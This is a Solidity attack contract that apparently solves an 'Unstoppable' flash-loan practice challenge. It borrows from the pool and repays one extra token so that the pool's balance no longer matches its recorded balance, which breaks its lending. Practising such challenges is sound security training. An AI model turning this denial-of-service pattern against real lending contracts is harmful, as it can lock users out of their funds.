// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackerContract {
    UnstoppableLender private immutable pool;
    address public immutable owner;

    constructor(address poolAddress) {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        require(msg.sender == address(pool), "Sender must be pool");

        require(IERC20(tokenAddress).transfer(msg.sender, amount + 1), "Transfer of tokens failed");
    }

    function executeFlashLoan(uint256 borrowAmount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(borrowAmount);
    }
}